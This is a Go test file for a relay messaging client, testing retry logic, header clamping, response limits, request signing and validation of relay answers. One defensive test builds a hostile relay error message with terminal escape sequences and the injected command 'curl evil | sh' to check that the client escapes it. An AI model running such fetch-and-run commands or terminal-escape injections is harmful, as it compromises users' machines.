package client

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"math"
	"net/http"
	"net/http/httptest"
	"net/url"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/tropeforce7/agentuucp/internal/envelope"
	"github.com/tropeforce7/agentuucp/internal/identity"
	"github.com/tropeforce7/agentuucp/internal/relayapi"
	"github.com/tropeforce7/agentuucp/internal/token"
)

// recorder is a stand-in relay that answers from a script and remembers what
// it was asked.
type recorder struct {
	mu      sync.Mutex
	replies []reply
	calls   int
	auths   []string
	// What each call asked: method and path, and the body as sent.
	requests []string
	bodies   [][]byte
}

type reply struct {
	status     int
	retryAfter string
	body       any
}

func (r *recorder) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	r.mu.Lock()
	i := r.calls
	r.calls++
	r.auths = append(r.auths, req.Header.Get(relayapi.AuthHeader))
	r.requests = append(r.requests, req.Method+" "+req.URL.RequestURI())
	body, _ := io.ReadAll(req.Body)
	r.bodies = append(r.bodies, body)
	rep := r.replies[min(i, len(r.replies)-1)]
	r.mu.Unlock()

	if rep.retryAfter != "" {
		w.Header().Set("Retry-After", rep.retryAfter)
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(rep.status)
	if rep.body != nil {
		json.NewEncoder(w).Encode(rep.body)
	}
}

func (r *recorder) count() int {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.calls
}

// newTestClient wires a client to a scripted relay and captures what it waits
// for instead of actually waiting.
func newTestClient(t *testing.T, rec *recorder) (*Client, *[]time.Duration) {
	t.Helper()
	id, err := identity.Generate("tester")
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(rec)
	t.Cleanup(srv.Close)

	c, err := New(srv.URL, id, nil)
	if err != nil {
		t.Fatal(err)
	}
	var slept []time.Duration
	c.sleep = func(ctx context.Context, d time.Duration) error {
		slept = append(slept, d)
		return nil
	}
	return c, &slept
}

func TestRetriesRateLimitThenSucceeds(t *testing.T) {
	rec := &recorder{replies: []reply{
		{status: http.StatusTooManyRequests, retryAfter: "7", body: relayapi.ErrorResponse{Error: "rate limited: posts"}},
		{status: http.StatusOK, body: relayapi.PostResponse{ID: 42}},
	}}
	c, slept := newTestClient(t, rec)

	var resp relayapi.PostResponse
	if err := c.do(t.Context(), "POST", "/v1/mailbox/x", []byte("{}"), &resp, nil); err != nil {
		t.Fatalf("a retried request failed: %v", err)
	}
	if resp.ID != 42 {
		t.Fatalf("got id %d, want the second response", resp.ID)
	}
	if rec.count() != 2 {
		t.Fatalf("made %d attempts, want 2", rec.count())
	}
	if len(*slept) != 1 || (*slept)[0] != 7*time.Second {
		t.Fatalf("waited %v, want one wait of 7s as the relay asked", *slept)
	}
	// Each attempt must carry its own signature: the relay spends the nonce.
	if rec.auths[0] == rec.auths[1] {
		t.Fatal("the retry replayed the first request's signature, which a relay refuses")
	}
}

func TestRetriesServiceUnavailable(t *testing.T) {
	rec := &recorder{replies: []reply{
		{status: http.StatusServiceUnavailable, retryAfter: "1", body: relayapi.ErrorResponse{Error: "relay is busy"}},
		{status: http.StatusOK, body: relayapi.HealthResponse{OK: true}},
	}}
	c, slept := newTestClient(t, rec)
	if err := c.Health(t.Context()); err != nil {
		t.Fatalf("a busy relay was not retried: %v", err)
	}
	if len(*slept) != 1 {
		t.Fatalf("waited %v, want one wait", *slept)
	}
}

func TestGivesUpWithWaitAdvice(t *testing.T) {
	rec := &recorder{replies: []reply{
		{status: http.StatusTooManyRequests, retryAfter: "5", body: relayapi.ErrorResponse{Error: "rate limited: requests"}},
	}}
	c, slept := newTestClient(t, rec)

	err := c.do(t.Context(), "GET", "/v1/mailbox/x", nil, nil, nil)
	if err == nil {
		t.Fatal("a relay that refused every attempt produced no error")
	}
	if rec.count() != maxRetries+1 {
		t.Fatalf("made %d attempts, want %d", rec.count(), maxRetries+1)
	}
	if len(*slept) != maxRetries {
		t.Fatalf("waited %v, want %d waits", *slept, maxRetries)
	}
	msg := err.Error()
	if !strings.Contains(msg, "rate limited: requests") {
		t.Fatalf("error %q does not carry what the relay said", msg)
	}
	if !strings.Contains(msg, "5s") {
		t.Fatalf("error %q does not tell the user how long to wait", msg)
	}
}

func TestFullMailboxIsNotRetried(t *testing.T) {
	rec := &recorder{replies: []reply{
		{status: http.StatusInsufficientStorage, body: relayapi.ErrorResponse{Error: relayapi.MsgMailboxFull}},
	}}
	c, slept := newTestClient(t, rec)

	err := c.do(t.Context(), "POST", "/v1/mailbox/x", []byte("{}"), nil, nil)
	if err == nil {
		t.Fatal("a 507 produced no error")
	}
	if rec.count() != 1 {
		t.Fatalf("made %d attempts; a full mailbox will not empty because we asked again", rec.count())
	}
	if len(*slept) != 0 {
		t.Fatalf("slept %v before giving up on a full mailbox", *slept)
	}
	var httpErr *HTTPError
	if !errors.As(err, &httpErr) || httpErr.Status != http.StatusInsufficientStorage {
		t.Fatalf("error %v does not surface as a 507 the caller can act on", err)
	}
	if httpErr.Message != relayapi.MsgMailboxFull {
		t.Fatalf("message %q, want %q", httpErr.Message, relayapi.MsgMailboxFull)
	}
}

func TestRetryAfterHeaderParsing(t *testing.T) {
	cases := []struct {
		header string
		want   time.Duration
	}{
		{"", 0},
		{"12", 12 * time.Second},
		{" 12 ", 12 * time.Second},
		{"-1", 0},
		{"Wed, 21 Oct 2026 07:28:00 GMT", 0}, // a date is ignored, not guessed at
		{"soon", 0},
	}
	for _, c := range cases {
		h := http.Header{}
		if c.header != "" {
			h.Set("Retry-After", c.header)
		}
		if got := retryAfter(h); got != c.want {
			t.Errorf("Retry-After %q parsed as %v, want %v", c.header, got, c.want)
		}
	}
}

func TestRetryWaitIsBounded(t *testing.T) {
	if got := retryWait(&HTTPError{}); got != minRetrySleep {
		t.Fatalf("a refusal with no Retry-After waits %v, want %v", got, minRetrySleep)
	}
	if got := retryWait(&HTTPError{RetryAfter: time.Hour}); got != maxRetrySleep {
		t.Fatalf("a relay asking for an hour got %v, want it capped at %v", got, maxRetrySleep)
	}
}

// Retry-After is a number from the relay, so its extremes are tested.
func TestRetryWaitBoundaries(t *testing.T) {
	cases := []struct {
		name string
		in   time.Duration
		want time.Duration
	}{
		{"absent", 0, minRetrySleep},
		{"negative", -time.Second, minRetrySleep},
		{"one second", time.Second, time.Second},
		{"one under the cap", maxRetrySleep - time.Second, maxRetrySleep - time.Second},
		{"exactly the cap", maxRetrySleep, maxRetrySleep},
		{"one over the cap", maxRetrySleep + time.Second, maxRetrySleep},
		{"an hour", time.Hour, maxRetrySleep},
		{"MaxInt64", time.Duration(math.MaxInt64), maxRetrySleep},
		{"MinInt64", time.Duration(math.MinInt64), minRetrySleep},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := retryWait(&HTTPError{RetryAfter: c.in}); got != c.want {
				t.Fatalf("retryWait(%v) = %v, want %v", c.in, got, c.want)
			}
		})
	}
}

// A header is a string from the wire; nothing in it may become a huge sleep or
// a negative one.
func TestRetryAfterHeaderExtremes(t *testing.T) {
	for header, want := range map[string]time.Duration{
		"0":                    0,
		"1":                    time.Second,
		"-1":                   0,
		"9223372036854775807":  maxRetryAfter, // clamped, not overflowed
		"99999999999999999999": 0,             // does not fit int64 at all
		"-9223372036854775808": 0,
		"2147483647":           maxRetryAfter, // 68 years, clamped to a day
		"86400":                maxRetryAfter, // exactly the clamp
		"86401":                maxRetryAfter,
		"86399":                86399 * time.Second,
		"":                     0,
		"  ":                   0,
		"1.5":                  0,
		"one":                  0,
	} {
		h := http.Header{}
		if header != "" {
			h.Set("Retry-After", header)
		}
		got := retryAfter(h)
		if got != want {
			t.Errorf("Retry-After %q parsed as %v, want %v", header, got, want)
		}
		// Whatever it parsed, the wait it produces must be sane.
		wait := retryWait(&HTTPError{RetryAfter: got})
		if wait < minRetrySleep || wait > maxRetrySleep {
			t.Errorf("Retry-After %q produced a wait of %v", header, wait)
		}
	}
}

// The client caps how much it will read from a relay it does not trust, so a
// hostile relay cannot exhaust a client's memory with one reply.
func TestResponseIsBounded(t *testing.T) {
	const size = 48 << 20
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		// Raw bytes, far past the client's ceiling.
		chunk := bytes.Repeat([]byte("x"), 1<<20)
		for range size >> 20 {
			if _, err := w.Write(chunk); err != nil {
				return
			}
		}
	}))
	t.Cleanup(srv.Close)

	id, err := identity.Generate("tester")
	if err != nil {
		t.Fatal(err)
	}
	c, err := New(srv.URL, id, nil)
	if err != nil {
		t.Fatal(err)
	}

	runtime.GC()
	var before, after runtime.MemStats
	runtime.ReadMemStats(&before)

	var out relayapi.PostResponse
	if err := c.do(t.Context(), "GET", "/v1/mailbox/x", nil, &out, nil); err == nil {
		t.Fatal("a 48 MiB reply of junk was accepted")
	}

	runtime.GC()
	runtime.ReadMemStats(&after)
	// The ceiling is DefaultMaxBytes*2; the client must not have held on to
	// much more than that.
	if grew := int64(after.HeapAlloc) - int64(before.HeapAlloc); grew > 3*relayapi.DefaultMaxBytes {
		t.Fatalf("the heap grew by %d bytes reading a %d byte reply", grew, size)
	}
}

// ListWait puts the hold and the watched peers on the query exactly as the
// relay reads them: wait as a Go duration clamped to the relay's ceiling,
// peers as FP:ISSUED in Unix nanoseconds sorted by fingerprint; and it
// reads directories_changed back. List asks for neither.
func TestListWaitCarriesTheHoldAndThePeers(t *testing.T) {
	answer := map[string]any{"messages": []any{}, "queued": 0, "directories_changed": []string{"bbbb", "aaaa"}}
	rec := &recorder{replies: []reply{{status: http.StatusOK, body: answer}}}
	c, _ := newTestClient(t, rec)
	box := "GET /v1/mailbox/" + c.id.Fingerprint()
	fpA := strings.Repeat("a", 64)
	fpB := strings.Repeat("b", 64)
	fpC := strings.Repeat("c", 64)
	issuedA := time.Date(2026, 9, 14, 1, 2, 3, 123456789, time.UTC)
	issuedB := time.Unix(0, 0)
	// The zero time is a peer with no directory held: Unix zero on the
	// wire, not the undefined UnixNano of the zero time.
	var issuedC time.Time

	l, err := c.ListWait(context.Background(), ListRequest{After: 5, Limit: 200, Wait: 20 * time.Second,
		Peers: map[string]time.Time{fpB: issuedB, fpC: issuedC, fpA: issuedA}})
	if err != nil {
		t.Fatal(err)
	}
	got, _ := rec.last()
	want := box + "?after=5&limit=200&wait=20s&peers=" + fpA + ":" + strconv.FormatInt(issuedA.UnixNano(), 10) +
		"," + fpB + ":0," + fpC + ":0"
	if got != want {
		t.Fatalf("the request:\n%s\nwant\n%s", got, want)
	}
	// Read back the way the relay reads it: a Go duration, and integers of
	// nanoseconds that give the times back to the nanosecond.
	q, err := url.ParseQuery(strings.SplitN(got, "?", 2)[1])
	if err != nil {
		t.Fatal(err)
	}
	if d, err := time.ParseDuration(q.Get("wait")); err != nil || d != 20*time.Second {
		t.Fatalf("wait read back as %v, %v", d, err)
	}
	for _, entry := range strings.Split(q.Get("peers"), ",") {
		fp, issued, _ := strings.Cut(entry, ":")
		nanos, err := strconv.ParseInt(issued, 10, 64)
		if err != nil {
			t.Fatal(err)
		}
		if back := time.Unix(0, nanos); !back.Equal(map[string]time.Time{fpA: issuedA, fpB: issuedB, fpC: issuedB}[fp]) {
			t.Fatalf("%s read back as %v", fp[:4], back)
		}
	}
	if strings.Join(l.DirectoriesChanged, " ") != "bbbb aaaa" {
		t.Fatalf("directories_changed read back as %v", l.DirectoriesChanged)
	}

	// Above the ceiling, clamped here as there; at it, as it is.
	for _, tc := range []struct {
		wait time.Duration
		want string
	}{
		{relayapi.MaxWait + time.Nanosecond, "wait=1m0s"},
		{10 * time.Minute, "wait=1m0s"},
		{relayapi.MaxWait, "wait=1m0s"},
		{relayapi.MaxWait - time.Nanosecond, "wait=59.999999999s"},
		{300 * time.Millisecond, "wait=300ms"},
	} {
		if _, err := c.ListWait(context.Background(), ListRequest{Wait: tc.wait}); err != nil {
			t.Fatal(err)
		}
		if got, _ := rec.last(); got != box+"?after=0&limit=50&"+tc.want {
			t.Fatalf("Wait %v: %s, want ...&%s", tc.wait, got, tc.want)
		}
	}
	// Zero and negative ask for no hold; no peers is no parameter.
	for _, wait := range []time.Duration{0, -time.Second} {
		if _, err := c.ListWait(context.Background(), ListRequest{Wait: wait, Peers: map[string]time.Time{}}); err != nil {
			t.Fatal(err)
		}
		if got, _ := rec.last(); got != box+"?after=0&limit=50" {
			t.Fatalf("Wait %v: %s", wait, got)
		}
	}
	// List is ListWait with neither.
	if _, err := c.List(context.Background(), 7, 20); err != nil {
		t.Fatal(err)
	}
	if got, _ := rec.last(); got != box+"?after=7&limit=20" {
		t.Fatalf("List: %s", got)
	}
	// A relay from before the field says nothing.
	rec.mu.Lock()
	rec.replies = []reply{{status: http.StatusOK, body: map[string]any{"messages": []any{}}}}
	rec.mu.Unlock()
	if l, err := c.ListWait(context.Background(), ListRequest{Wait: time.Second}); err != nil || l.DirectoriesChanged != nil {
		t.Fatalf("an old relay's answer: %+v %v", l, err)
	}
}

// A relay that answers after the hold it was asked for is a relay that
// held the listing, not one that failed: the answer comes back whole, and
// the client's own per-request timeout outlives the longest hold.
func TestARelayThatAnswersAfterTheHoldIsNotATransportError(t *testing.T) {
	id, err := identity.Generate("tester")
	if err != nil {
		t.Fatal(err)
	}
	var held atomic.Int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		wait, err := time.ParseDuration(req.URL.Query().Get("wait"))
		if err != nil {
			t.Errorf("wait: %v", err)
		}
		// Held for the whole wait, and then some: the relay answers when
		// something arrives, which can be at the wait's very end.
		time.Sleep(wait + 200*time.Millisecond)
		held.Add(1)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{
			"messages": []map[string]any{{"id": 9, "received": "2026-09-14T00:00:00Z", "kind": "envelope",
				"size": 3, "channel": "default", "envelope": map[string]any{"v": 1, "to": "x", "ct": "AAA"}}},
			"queued": 1,
		})
	}))
	t.Cleanup(srv.Close)
	c, err := New(srv.URL, id, nil)
	if err != nil {
		t.Fatal(err)
	}
	if c.http.Timeout <= relayapi.MaxWait {
		t.Fatalf("the client's per-request timeout is %v, which does not outlive a hold of %v", c.http.Timeout, relayapi.MaxWait)
	}
	l, err := c.ListWait(context.Background(), ListRequest{Wait: time.Second})
	if err != nil {
		t.Fatalf("a listing answered after its hold: %v", err)
	}
	if held.Load() != 1 || len(l.Messages) != 1 || l.Messages[0].ID != 9 || l.Queued != 1 {
		t.Fatalf("the answer after the hold: %+v", l)
	}
	// The caller's context bounds the hold, as a wait's deadline does: a
	// context that ends first is the error, and the relay's later answer
	// is nobody's.
	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()
	if _, err := c.ListWait(ctx, ListRequest{Wait: 5 * time.Second}); !errors.Is(err, context.DeadlineExceeded) {
		t.Fatalf("a context ending inside the hold: %v", err)
	}
}

// TestTheClientSignsOnlyWhatTheRelayVerifies: the health check and the
// key lookup carry no auth header on the wire, because the relay reads
// none on them, and a signature there would only put the caller's
// fingerprint in a full-mode access log on a route that did not need it;
// a listing, a post and a registration are signed, because the relay
// verifies those.
func TestTheClientSignsOnlyWhatTheRelayVerifies(t *testing.T) {
	id, err := identity.Generate("peer")
	if err != nil {
		t.Fatal(err)
	}
	fp := id.Fingerprint()
	rec := &recorder{replies: []reply{
		{status: 200, body: relayapi.HealthResponse{OK: true, MLDSA: 65}},
		{status: 200, body: relayapi.KeysResponse{Bundle: id.Public().Bundle(), Name: "peer"}},
		{status: 200, body: relayapi.KeysResponse{Bundle: id.Public().Bundle(), Name: "peer"}},
		{status: 200, body: relayapi.ListResponse{}},
		{status: 200, body: relayapi.PostResponse{ID: 1}},
	}}
	c, _ := newTestClient(t, rec)
	rec.replies = append(rec.replies, reply{status: 200, body: relayapi.RegisterResponse{FP: c.id.Fingerprint()}})
	if err := c.Health(t.Context()); err != nil {
		t.Fatal(err)
	}
	if _, err := c.MLDSA(t.Context()); err != nil {
		t.Fatal(err)
	}
	if _, err := c.Lookup(t.Context(), fp); err != nil {
		t.Fatal(err)
	}
	if _, err := c.List(t.Context(), 0, 0); err != nil {
		t.Fatal(err)
	}
	if _, err := c.Post(t.Context(), &envelope.Envelope{V: 1, To: c.id.Fingerprint(), CT: []byte("ct")}, ""); err != nil {
		t.Fatal(err)
	}
	if _, err := c.Register(t.Context(), nil); err != nil {
		t.Fatal(err)
	}
	rec.mu.Lock()
	defer rec.mu.Unlock()
	for i, want := range []struct {
		request string
		signed  bool
	}{
		{"GET /v1/health", false},
		{"GET /v1/health", false},
		{"GET /v1/keys/" + fp, false},
		{"GET /v1/mailbox/" + c.id.Fingerprint(), true},
		{"POST /v1/mailbox/" + c.id.Fingerprint(), true},
		{"POST /v1/register", true},
	} {
		if !strings.HasPrefix(rec.requests[i], want.request) {
			t.Fatalf("call %d was %q, want %s", i, rec.requests[i], want.request)
		}
		if signed := rec.auths[i] != ""; signed != want.signed {
			t.Errorf("%s: auth header %q; signed %v, want %v", want.request, rec.auths[i], signed, want.signed)
		}
	}
}

// TestTheAnchorFetchCarriesNoIdentity: the trust anchor is asked for
// before there is anything to prove or anybody to prove it to, and the
// request says so on the wire: no auth header, and nothing else that names
// a caller.
func TestTheAnchorFetchCarriesNoIdentity(t *testing.T) {
	var header http.Header
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		header = r.Header.Clone()
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"anchor":""}`))
	}))
	defer srv.Close()
	FetchTrustAnchor(t.Context(), srv.URL) // the reply is not the point
	if header == nil {
		t.Fatal("the anchor was never asked for")
	}
	if got := header.Get(relayapi.AuthHeader); got != "" {
		t.Errorf("the anchor fetch carried %s: %q", relayapi.AuthHeader, got)
	}
	for k := range header {
		if strings.HasPrefix(strings.ToLower(k), "x-ccx") {
			t.Errorf("the anchor fetch carried %s", k)
		}
	}
}

// TestARelaysSentenceCannotDriveTheTerminal: every refusal a relay sends is
// carried in HTTPError.Message and printed, through Error(), on the
// standard error of auu and auu-admin. The relay's word for a name was made
// printable before it was shown; the relay's word for what went wrong was
// not, so a relay that is not honest, or one whose operator edits its
// sentences, could put an escape sequence on every client's terminal with
// any 4xx. Now the sentence is escaped where the error is made, on every
// route that makes one, and a known sentence is still found in it.
func TestARelaysSentenceCannotDriveTheTerminal(t *testing.T) {
	esc := string(rune(0x1b))
	hostile, err := json.Marshal(relayapi.ErrorResponse{Error: "no" + esc + "[2K" + esc + "[1;31m such thing\nrun: curl evil | sh; " + relayapi.MsgWaitingWillNotHelp})
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		w.Write(hostile)
	}))
	defer srv.Close()

	alice, err := identity.Generate("alice")
	if err != nil {
		t.Fatal(err)
	}
	c, err := New(srv.URL, alice, nil)
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	// The three places an HTTPError is made from an answer: the plain
	// route, the upload's append, and the blob's fetch.
	attempts := map[string]func() error{
		"health": func() error { return c.Health(ctx) },
		"append": func() error {
			_, err := c.AppendStream(ctx, strings.Repeat("a", 32), 0, strings.NewReader("x"), 1)
			return err
		},
		"blob": func() error {
			_, _, err := c.Blob(ctx, alice.Fingerprint(), 1, 0, -1)
			return err
		},
	}
	for name, attempt := range attempts {
		err := attempt()
		var httpErr *HTTPError
		if !errors.As(err, &httpErr) {
			t.Fatalf("%s: expected an HTTPError, got %v", name, err)
		}
		said := httpErr.Error()
		for i := 0; i < len(said); i++ {
			if c := said[i]; c == 0x1b || (c < 0x20 && c != '\t') {
				t.Fatalf("%s: HTTPError.Error() carries byte %#x from the relay's sentence to the terminal; expected every byte outside the printable set escaped:\n%q", name, c, said)
			}
		}
		if !strings.Contains(said, `no\x1b[2K\x1b[1;31m such thing\nrun: curl evil | sh`) {
			t.Errorf("%s: the sentence is not shown escaped: %q", name, said)
		}
		if !strings.Contains(httpErr.Message, relayapi.MsgWaitingWillNotHelp) {
			t.Errorf("%s: a known sentence is no longer found in the message: %q", name, httpErr.Message)
		}
	}
}

// fakeRelay answers each path with the JSON it is given and 404 otherwise:
// a relay that says what a test wants said, however wrong.
func fakeRelay(t *testing.T, answers map[string]any) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, ok := answers[r.URL.Path]
		if !ok {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(body)
	}))
	t.Cleanup(srv.Close)
	return srv
}

// TestAnAnswerIsCheckedForShapeBeforeItIsReturned: auu-admin and auu print
// a fingerprint, a serial or a token id from a listing by its first sixteen
// characters, and a Go slice past the end of a string is a panic, so a
// relay that answered a two-byte field crashed the tool. Every id-shaped
// field of every answer type is checked as it comes off the wire, and a
// field that fails makes the whole answer a malformed-answer error naming
// the field and the relay, never a partial listing; a seconds field is
// bounded before anything multiplies it.
func TestAnAnswerIsCheckedForShapeBeforeItIsReturned(t *testing.T) {
	alice, err := identity.Generate("alice")
	if err != nil {
		t.Fatal(err)
	}
	fp := alice.Fingerprint()
	const serial = "0123456789abcdef0123456789abcdef"
	tokenID := strings.Repeat("7", 32)
	good := map[string]any{
		"/v1/admin/status": relayapi.AdminStatusResponse{CAFingerprint: fp, TokenMaxAgeSecs: 3600, CertLifetimeSecs: 86400,
			Registration: relayapi.RegistrationToken, ClientCerts: relayapi.ClientCertsRequired},
		"/v1/admin/mailboxes": relayapi.MailboxListResponse{
			Mailboxes: []relayapi.MailboxRecord{{FP: fp, Name: "alice", Allow: relayapi.AllowSigned}}, Next: fp},
		"/v1/admin/mailboxes/" + fp:    relayapi.MailboxRecord{FP: fp, Name: "alice"},
		"/v1/admin/blocks":             relayapi.BlocksResponse{Blocks: []relayapi.BlockRecord{{FP: fp, ByFP: fp}}},
		"/v1/admin/tokens":             relayapi.TokenListResponse{Tokens: []relayapi.TokenRecord{{ID: tokenID, Issuer: fp, Subject: fp, Use: token.UseRegister, State: relayapi.TokenLive}}},
		"/v1/admin/certs":              relayapi.CertsResponse{Certs: []relayapi.CertRecord{{Serial: serial, FP: fp}}},
		"/v1/mailbox/" + fp + "/certs": relayapi.CertsResponse{Certs: []relayapi.CertRecord{{Serial: serial}}},
	}
	calls := map[string]func(c *Client) error{
		"/v1/admin/status":             func(c *Client) error { _, err := c.AdminStatus(context.Background()); return err },
		"/v1/admin/mailboxes":          func(c *Client) error { _, err := c.AdminMailboxes(context.Background(), "", 0); return err },
		"/v1/admin/mailboxes/" + fp:    func(c *Client) error { _, err := c.AdminMailbox(context.Background(), fp); return err },
		"/v1/admin/blocks":             func(c *Client) error { _, err := c.AdminBlocks(context.Background()); return err },
		"/v1/admin/tokens":             func(c *Client) error { _, err := c.AdminTokens(context.Background(), false); return err },
		"/v1/admin/certs":              func(c *Client) error { _, err := c.AdminCerts(context.Background(), "", false); return err },
		"/v1/mailbox/" + fp + "/certs": func(c *Client) error { _, err := c.Certs(context.Background()); return err },
	}
	// Every answer as a relay gives it is taken.
	srv := fakeRelay(t, good)
	c, err := New(srv.URL, alice, nil)
	if err != nil {
		t.Fatal(err)
	}
	for path, call := range calls {
		if err := call(c); err != nil {
			t.Errorf("%s, well formed: %v", path, err)
		}
	}

	// One field wrong at a time: the answer is refused, naming the field
	// and the relay, and nothing panics.
	for _, tc := range []struct {
		path, field string
		answer      any
	}{
		{"/v1/admin/status", "ca_fingerprint", relayapi.AdminStatusResponse{CAFingerprint: "ab"}},
		{"/v1/admin/status", "token_max_age_seconds", relayapi.AdminStatusResponse{TokenMaxAgeSecs: relayapi.MaxDurationSeconds + 1}},
		{"/v1/admin/status", "cert_lifetime_seconds", relayapi.AdminStatusResponse{CertLifetimeSecs: -1}},
		{"/v1/admin/mailboxes", "fp", relayapi.MailboxListResponse{Mailboxes: []relayapi.MailboxRecord{{FP: "ab"}}}},
		{"/v1/admin/mailboxes", "next", relayapi.MailboxListResponse{Next: "ab"}},
		{"/v1/admin/mailboxes/" + fp, "fp", relayapi.MailboxRecord{FP: "ab"}},
		{"/v1/admin/blocks", "fp", relayapi.BlocksResponse{Blocks: []relayapi.BlockRecord{{FP: "ab", ByFP: fp}}}},
		{"/v1/admin/blocks", "by_fp", relayapi.BlocksResponse{Blocks: []relayapi.BlockRecord{{FP: fp, ByFP: "ab"}}}},
		{"/v1/admin/tokens", "id", relayapi.TokenListResponse{Tokens: []relayapi.TokenRecord{{ID: "ab", Issuer: fp, Use: token.UseRegister, State: relayapi.TokenLive}}}},
		{"/v1/admin/tokens", "issuer", relayapi.TokenListResponse{Tokens: []relayapi.TokenRecord{{ID: tokenID, Issuer: "ab", Use: token.UseRegister, State: relayapi.TokenLive}}}},
		{"/v1/admin/tokens", "subject", relayapi.TokenListResponse{Tokens: []relayapi.TokenRecord{{ID: tokenID, Issuer: fp, Subject: "ab", Use: token.UseRegister, State: relayapi.TokenLive}}}},
		{"/v1/admin/tokens", "use", relayapi.TokenListResponse{Tokens: []relayapi.TokenRecord{{ID: tokenID, Issuer: fp, Use: "register\x1b", State: relayapi.TokenLive}}}},
		{"/v1/admin/tokens", "state", relayapi.TokenListResponse{Tokens: []relayapi.TokenRecord{{ID: tokenID, Issuer: fp, Use: token.UseRegister, State: "live\x1b"}}}},
		{"/v1/admin/status", "registration", relayapi.AdminStatusResponse{Registration: "open\x1b"}},
		{"/v1/admin/status", "client_certs", relayapi.AdminStatusResponse{ClientCerts: "off\x1b"}},
		{"/v1/admin/mailboxes", "allow", relayapi.MailboxListResponse{Mailboxes: []relayapi.MailboxRecord{{FP: fp, Allow: "signed\x1b"}}}},
		{"/v1/admin/mailboxes/" + fp, "allow", relayapi.MailboxRecord{FP: fp, Allow: "broken\x1b"}},
		{"/v1/admin/certs", "serial", relayapi.CertsResponse{Certs: []relayapi.CertRecord{{Serial: "ab", FP: fp}}}},
		{"/v1/admin/certs", "fp", relayapi.CertsResponse{Certs: []relayapi.CertRecord{{Serial: serial, FP: "ab"}}}},
		{"/v1/admin/certs", "fp", relayapi.CertsResponse{Certs: []relayapi.CertRecord{{Serial: serial}}}},
		{"/v1/mailbox/" + fp + "/certs", "serial", relayapi.CertsResponse{Certs: []relayapi.CertRecord{{Serial: "ab"}}}},
		{"/v1/mailbox/" + fp + "/certs", "fp", relayapi.CertsResponse{Certs: []relayapi.CertRecord{{Serial: serial, FP: "ab"}}}},
	} {
		srv := fakeRelay(t, map[string]any{tc.path: tc.answer})
		c, err := New(srv.URL, alice, nil)
		if err != nil {
			t.Fatal(err)
		}
		err = calls[tc.path](c)
		if !errors.Is(err, ErrMalformedAnswer) {
			t.Errorf("%s with a bad %s: %v, want ErrMalformedAnswer", tc.path, tc.field, err)
			continue
		}
		if !strings.Contains(err.Error(), tc.field+" is not") || !strings.Contains(err.Error(), srv.URL) {
			t.Errorf("%s with a bad %s: %q does not name the field and the relay", tc.path, tc.field, err)
		}
		if strings.Contains(err.Error(), `"ab"`) {
			t.Errorf("%s: the refusal repeats the value: %q", tc.path, err)
		}
	}
}
